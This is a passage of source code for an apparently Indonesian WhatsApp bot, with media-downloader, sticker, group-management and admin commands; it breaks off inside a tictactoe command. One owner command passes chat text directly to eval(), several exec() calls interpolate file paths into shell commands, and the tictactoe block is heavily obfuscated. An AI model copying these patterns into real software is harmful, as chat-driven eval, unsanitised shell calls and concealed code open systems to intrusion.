						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								const captionsYtmp4 = `❏ *YTmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n❏ *Size* : ${filesizeF}\n\n_Video sedang dikirim, Silahkan tunggu beberapa menit_`
								sendMediaURL(from, thumb, captionsYtmp4)
								sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
							})
			
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytsearch':
						case 'yts':
            if (!args.length) return reply('Judulnya apa kak?')
            try {
            	reply(mess.wait)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `┌ ◪ *YOUTUBE SEARCH*
└ *Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ ❏ *Judul:* ${items[i].title}
├ ❏ *Id:* ${items[i].id}
├ ❏ *Ditonton:* ${items[i].views}
├ ❏ *Durasi:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await hypermod.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link yt] = Audio
└ ${prefix}ytmp4 [link yt] = Video`})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
					case 'ytmp3':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
						let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								const captions = `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n❏ *Size* : ${filesizeF}\n\n_Audio sedang dikirim, Silahkan tunggu beberapa menit_`
								sendMediaURL(from, thumb, captions)
								sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
							})

							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
case 'play2': case 'playmp3':
                if (args.length === 1) return reply(`Kirim perintah *${prefix}play query*`)
                try {
                    reply(mess.wait)
                    let yut = await yts(q)
                    yta(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 30000) return sendFileFromUrl(from, thumb, `*Data Berhasil Didapatkan!*\n*▢ Title : ${title}*\n*▢ Ext : MP3*\n*▢ Filesize : ${filesizeF}*\n*▢ ID : ${yut.videos[0].videoId}*\n*▢ Upload : ${yut.videos[0].ago}*\n*▢ Ditonton : ${yut.videos[0].views}*\n*▢ Duration : ${yut.videos[0].timestamp}\n*▢ Link : ${a.data}*\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                        const captionis = `*Data Berhasil Didapatkan!*\n*▢ Title : ${title}*\n*▢ Ext : MP3*\n*▢ Size : ${filesizeF}*\n*▢ ID : ${yut.videos[0].videoId}*\n*▢ Upload : ${yut.videos[0].ago}*\n*▢ Ditonton : ${yut.videos[0].views}*\n*▢ Duration : ${yut.videos[0].timestamp}*\n*▢ URL : ${yut.videos[0].url}*\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionis, msg)
                            sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
							})

							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
case 'ig':
            case 'igdl':
            case 'instagram':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ig* link ig`)
                reply(mess.wait)
                getPost(args[1].split('/')[4])
                .then((res) => {
                    let { owner_user, post, date, capt } = res
                    let caption = `*Data Berhasil Didapatkan!*\n*▢ Owner : ${owner_user}*\n▢ Jumlah Media : ${post.length}*\n*▢ Caption :${capt}*\n\n_Harap tunggu sebentar, media akan segera dikirim_`
                    sendMess(from, caption)
                    for (let i = 0; i < post.length; i++){
                        sendFileFromUrl(from, post[i].url)
                    }

                })
			 break
            case 'fb':
            case 'fbdl':
            case 'facebook':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}fb* url`)
                reply(mess.wait)
                fbdl(args[1])
                .then((res) => {
                    sendFileFromUrl(from, res.result.links[0].url)
                })
						break
                    case 'play':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                            const playy = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulaikah = playy.data.result[0].url
                            try {
                                reply(mess.wait)
                                yta(mulaikah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
                                    const captions = `❏ *PLAYmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n❏ *Size* : ${filesizeF}\n\n_Audio sedang dikirim, Silahkan tunggu beberapa menit_`
                                    sendMediaURL(from, thumb, captions)
                                    await sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                    })
                
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
                            case 'video':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
                            const playi = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulaihah = playi.data.result[0].url
                            try {
                                reply(mess.wait)
                                ytv(mulaihah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP4\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
                                    const captions = `❏ *PLAYmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP4\n❏ *Size* : ${filesizeF}\n\n_Video sedang dikirim, Silahkan tunggu beberapa menit_`
                                    sendMediaURL(from, thumb, captions)
                                    await sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                    })
                
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
                    case 'exif':
                    if (!isOwner) return reply(mess.only.ownerB)
					const exifff = body.slice(6)
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
case 'beliapi':        	
                    beliapi = `[ *API SC* ]\n`
                    beliapi += `➻ *LOLHUMAN* : wa.me/62895418200111\n`
                    beliapi += `➻ *HUNTER* : wa.me/6281313505348\n`
                    beliapi += `➻ *XTEAM* : wa.me/6281946983575\n`
                    reply(beliapi)
                    break
				case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await hypermod.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											hypermod.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await hypermod.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											hypermod.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await hypermod.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											hypermod.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await hypermod.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											hypermod.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'takestick':
					case 'take':
						if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
						const pembawm = body.slice(11)
						if (!pembawm.includes('|')) return await reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await hypermod.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = pembawm.split('|')[0]
						const author = pembawm.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							hypermod.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break
			case 'speed':
			case 'ping':
					const timestampi = speed();
					const latensyi = speed() - timestampi
					sendFakeStatus(from, `*Speed: ${latensyi.toFixed(4)} Second*`)
					break
				case 'return':
				case '>':
				if (!isOwner) return reply(mess.only.ownerB)
					return hypermod.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					break
				case 'toimg':
				case 'tomedia':
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await hypermod.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await hypermod.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							hypermod.sendMessage(from, buffer, image, {quoted: mek})
							fs.unlinkSync(ran)
						})
					}
					break
				case 'ss':
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`)
					break
				break
				case 'addsticker':
				if (!isOwner) return reply(mess.only.ownerB)
					if (!isQuotedSticker) return reply('Reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await hypermod.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
					hypermod.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./media/sticker/${nmm}.webp`)
					 sendFakeStatus(from, 'Sukses', fake)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					hypermod.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner) return reply(mess.only.ownerB)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await hypermod.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					hypermod.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					sendFakeStatus(from, 'Sukses', fake)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					hypermod.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner) return reply(mess.only.ownerB)
					if (!isQuotedImage) return reply('Reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await hypermod.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					hypermod.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/image/${nmm}.jpg`)
					 sendFakeStatus(from, 'Sukses', fake)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
					teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					hypermod.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await hypermod.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./media/sticker/${wanu[1]}.webp`)
				hypermod.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
				runtime = process.uptime()
				teks = `${waktu(runtime)}`
				sendFakeStatus(from, teks, `*Runtime*`)
				break
			case 'setprefix':
			if (!isOwner) return reply(mess.only.ownerB)
			if (args.length < 1) return reply('Teksnya?')
				prefix = args[0]
				sendFakeStatus(from, 'Sukses', fake)
				break
				case 'setbio':
				if (!isOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					hypermod.setStatus(`${iyek}`)
					sendFakeStatus(from, 'Sukses', fake)
					break
					case 'setname':
					if (!isOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                hypermod.updateProfileName(anu)
                sendFakeStatus(from, 'Sukses', fake)
                break
			case 'add':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				if (args.length < 1) return reply(`Penggunaan ${prefix}add nomor`)
				hypermod.groupAdd(from, [args[0] + '@s.whatsapp.net'])
				sendFakeStatus(from, `Sukses`, fake)
				break
			case 'kick':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				if (args.length < 1) return reply(`Penggunaan ${prefix}kick nomor|tag`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						hypermod.groupRemove(from, mentioned[i])
                    }
                    sendFakeStatus(from, 'bye', fake)
                } else {
                    hypermod.groupRemove(from, args[0] + '@s.whatsapp.net')
                    sendFakeStatus(from, 'bye', fake)
                }
				break
			case 'creategroup':
			case 'creategrup':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					hypermod.groupCreate(argz[0], anu)
					sendFakeStatus(from, `Sukses`, fake)
                }
				break
			case 'addrespon':
			if (!isOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				sendFakeStatus(from, `Ok berhasil gan`, fake)
				break
			case 'delrespon':
			if (!isOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(6), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(6), commandsDB)
				sendFakeStatus(from, `Ok berhasil gan`, fake)
				break
				case 'tictactoe':
            case 'ttt':            
            var _0x4917=['yM9HCMq','C3rLCa','C3rYAw5NAwz5','mtjUqwDktwe','nE+4J+kdOW','mZu5mZaZywPHv0jY','mE+4J+kdOW','mZC0mtmZzNrTA0nw','oo+4J+kdOW','rxHHBxbSztOG','mJGZndmWzNvSy1fh','D3jPDgvgAwXLu3LUyW','murluNjWBq','mvLxAwnmBa','mZaWmZvrEw1RAem','nU+4J+kdOW','mU+4J+kdOW','cGPqBgf5zxiGmJOGqa','Dg9mB3DLCKnHC2u','zw5LBxK','Bw9Kzq','mwLhq2rkrW','DgLJDgfJDg9LifGVtYbaDgfNigXHD2fU','lI9KyxrHyMfZzs90Awn0ywn0B2uUANnVBG','mZq4otzyDhjtDui','ugXHEwvYide6iea','thuGBwf1ig1Hzw4Gyw1HihnPyxbHig95','mtyYntCXogXQueXSra','ndC3ntyYD0jSu3LA','m++4J+kdOW','n++4J+kdOW','no+4J+kdOW','oE+4J+kdOW','C2vUze1LC3nHz2u','BgvUz3rO','z3jVDxa','Aw5JBhvKzxm','C3bSAxq'];var _0x273a71=_0x30c0;(function(_0x12be5c,_0x3b1746){var _0x5ae0ef=_0x30c0;while(!![]){try{var _0x5bc7c0=-parseInt(_0x5ae0ef(0x13d))+parseInt(_0x5ae0ef(0x139))*-parseInt(_0x5ae0ef(0x14a))+parseInt(_0x5ae0ef(0x136))*-parseInt(_0x5ae0ef(0x14c))+-parseInt(_0x5ae0ef(0x12f))+-parseInt(_0x5ae0ef(0x12e))*parseInt(_0x5ae0ef(0x14e))+parseInt(_0x5ae0ef(0x151))*parseInt(_0x5ae0ef(0x12d))+parseInt(_0x5ae0ef(0x13c));if(_0x5bc7c0===_0x3b1746)break;else _0x12be5c['push'](_0x12be5c['shift']());}catch(_0x637962){_0x12be5c['push'](_0x12be5c['shift']());}}}(_0x4917,0x3ce13));if(!isGroup)return reply(mess['only'][_0x273a71(0x144)]);if(mentionUser[_0x273a71(0x143)]==0x0)return await reply(_0x273a71(0x13b));if(args[_0x273a71(0x143)]==0x1)return await reply(_0x273a71(0x150)+prefix+'tictactoe\x20X/O\x20@tag\x20lawan');if(!['x','o'][_0x273a71(0x145)](args[0x0][_0x273a71(0x133)]()))return await reply('Example:\x20'+prefix+_0x273a71(0x137));nantang=X,pelawan=O;args[0x0][_0x273a71(0x133)]()=='o'&&(nantang=O,pelawan=X);var board=[_0x273a71(0x14d),_0x273a71(0x131),_0x273a71(0x13e),_0x273a71(0x140),_0x273a71(0x14b),_0x273a71(0x130),_0x273a71(0x13f),_0x273a71(0x14f),_0x273a71(0x141)],penantang=sender,lawan=mentionUser[0x0];tesk=_0x273a71(0x13a)+penantang[_0x273a71(0x146)]('@')[0x0]+'\x20('+nantang+')\x20'+tunjuk+'\x0a';var count=0x0;function _0x30c0(_0x1b870b,_0x5aefbc){_0x1b870b=_0x1b870b-0x12c;var _0x491788=_0x4917[_0x1b870b];if(_0x30c0['Iuhvyw']===undefined){var _0x30c087=function(_0x7a7bc1){var _0xd56b0a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2cd12b='';for(var _0xbebbea=0x0,_0x4ac8e8,_0x10aeef,_0x3c8bb4=0x0;_0x10aeef=_0x7a7bc1['charAt'](_0x3c8bb4++);~_0x10aeef&&(_0x4ac8e8=_0xbebbea%0x4?_0x4ac8e8*0x40+_0x10aeef:_0x10aeef,_0xbebbea++%0x4)?_0x2cd12b+=String['fromCharCode'](0xff&_0x4ac8e8>>(-0x2*_0xbebbea&0x6)):0x0){_0x10aeef=_0xd56b0a['indexOf'](_0x10aeef);}return _0x2cd12b;};_0x30c0['GsFjxe']=function(_0x575ee7){var _0x43ed18=_0x30c087(_0x575ee7);var _0x39ad58=[];for(var _0x1dc72c=0x0,_0x4ab19d=_0x43ed18['length'];_0x1dc72c<_0x4ab19d;_0x1dc72c++){_0x39ad58+='%'+('00'+_0x43ed18['charCodeAt'](_0x1dc72c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x39ad58);},_0x30c0['BFFsQs']={},_0x30c0['Iuhvyw']=!![];}var _0x21031f=_0x4917[0x0],_0xfd5c96=_0x1b870b+_0x21031f,_0x208688=_0x30c0['BFFsQs'][_0xfd5c96];return _0x208688===undefined?(_0x491788=_0x30c0['GsFjxe'](_0x491788),_0x30c0['BFFsQs'][_0xfd5c96]=_0x491788):_0x491788=_0x208688,_0x491788;}for(var x of board){count%0x3==0x0&&(tesk+='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20'),tesk+=x,count+=0x1;}tesk+=_0x273a71(0x132)+lawan['split']('@')[0x0]+'\x20('+pelawan+')';return hypermod[_0x273a71(0x142)](from,tesk,text,{'quoted':mek,'contextInfo':{'mentionedJid':[penantang,lawan]}})['then'](()=>{var 